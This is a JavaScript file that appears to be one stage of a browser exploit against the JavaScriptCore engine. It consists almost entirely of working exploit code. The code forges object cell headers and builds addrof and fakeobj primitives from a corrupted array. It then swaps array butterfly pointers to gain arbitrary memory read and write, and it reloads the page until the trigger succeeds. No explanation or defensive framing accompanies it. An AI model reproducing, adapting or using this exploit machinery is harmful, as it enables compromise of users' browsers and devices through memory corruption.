let doubleArrayCellHeader = new Int64(0x0108230700000000);
const kBoxedDoubleOffset = new Int64(0x0002000000000000);
const leak = 0x1a;

function createJSObjectmirror(target, _internal_prims = primitives) {
  let _internal = {
    jsCellHeader: doubleArrayCellHeader.sub(kBoxedDoubleOffset).asDouble(),
    butterfly: target,
  };

  let _internal_address = _internal_prims.addrof(_internal);
  let _internal_object = _internal_prims.fakeobj(_internal_address.add(0x10));

  let _internal_target = {
    get jsCellHeader() {
      return Int64.fromDouble(_internal_object[0]);
    },
    set jsCellHeader(newHeader) {
      _internal_object[0] = newHeader.asDouble();
    },

    get butterfly() {
      return Int64.fromDouble(_internal_object[1]);
    },

    set butterfly(newButterfly) {
      _internal_object[1] = newButterfly.asDouble();
    },
  };

  return {
    get jsCellHeader() {
      return Int64.fromDouble(_internal.jsCellHeader);
    },
    set jsCellHeader(newHeader) {
      _internal.jsCellHeader = newHeader.asDouble();
    },

    get target() {
      return _internal_target;
    },
    set target(newButterfly) {
      _internal.butterfly = newButterfly;
    },
  };
}

stages.push(() => {
  if (boxedDoubles.length != leak) {
    window.alert(
      `Trigger failed, reloading (0x${boxedDoubles.length.toString(16)})`
    );
    window.location.reload();
    return;
  }

  primitives = new (class {
    constructor() {
      this.readWriteDoubles = boxedDoubles;
      this.readWriteContiguous = contiguous;

      this.mirror = createJSObjectmirror(initialDoubles, {
        addrof: (value) => {
          this.readWriteContiguous[0] = value;
          return Int64.fromDouble(this.readWriteDoubles[leak]);
        },
        fakeobj: (address) => {
          this.readWriteDoubles[0x1a] = address.asDouble(); // Have trust ;)
          return this.readWriteContiguous[0];
        },
      });

      doubleArrayCellHeader = this.mirror.target.jsCellHeader
        .sub(0x1)
        .add(0x1000000000);

      this.mirror.target.jsCellHeader = doubleArrayCellHeader;

      this.originalButterfly = this.mirror.target.butterfly;

      this.mirror.target = initialContiguous;
      this.mirror.target.jsCellHeader = doubleArrayCellHeader;

      this.mirror.jsCellHeader = doubleArrayCellHeader.sub(kBoxedDoubleOffset);

      this.mirror = this.mirror;
      this.originalButterfly = this.originalButterfly;

      this._setSharedButterfly(this.originalButterfly);
    }

    _setSharedButterfly(newButterfly) {
      for (let i = 0; i < 2; i++) {
        // TODO: Why twice
        this.mirror.target = this.readWriteContiguous;
        this.mirror.target.butterfly = newButterfly;
        this.mirror.target = this.readWriteDoubles;
        this.mirror.target.butterfly = newButterfly;
      }
    }

    _resetButterfly() {
      this._setSharedButterfly(this.originalButterfly);
    }

    _read64(where) {
      this._setSharedButterfly(where);
      const val = Int64.fromDouble(this.readWriteDoubles[0]);
      this._resetButterfly();
      return val;
    }

    _write64(where, what) {
      this._setSharedButterfly(where);
      this.readWriteContiguous[0] = what;
      this._resetButterfly();
    }

    _writeDouble(where, what) {
      this._setSharedButterfly(where);
      this.readWriteDoubles[0] = what.asDouble();
      this._resetButterfly();
    }

    _list(addr, times) {
      printf(`Listing [${addr}]`);
      for (var i = 0; i < times; i++) {
        printf(`[${i}: ${Add(addr, i * 8)}] ${this._read64(Add(addr, i * 8))}`);
      }
    }

    _callConstructor(ctor, args = []) {
      const concatinatedArgs = [null].concat([].slice.call(args));
      return new (ctor.bind.apply(ctor, concatinatedArgs))();
    }

    _spawnObject(type, initArgs = []) {
      let header;
      let instance;
      do {
        instance = this._callConstructor(type, initArgs);
        header = this._read64(this.addrof(instance));
      } while (header.byteAt(7) == 0x7f || header.byteAt(7) == 0x40);
      return [header, instance];
    }

    getValidHeader(type, initArgs = []) {
      return this._spawnObject(type, initArgs)[0].asCellHeader();
    }

    getNonOpaqueObject(type, initArgs = []) {
      return this._spawnObject(type, initArgs)[1];
    }

    addrof(object) {
      this.readWriteContiguous[0] = object;
      return Int64.fromDouble(this.readWriteDoubles[0]);
    }

    fakeobj(address) {
      this.readWriteDoubles[0] = address.asDouble();
      return this.readWriteContiguous[0];
    }
  })();

  gc();

  printf(`Constructed internal primitives`, 2);
});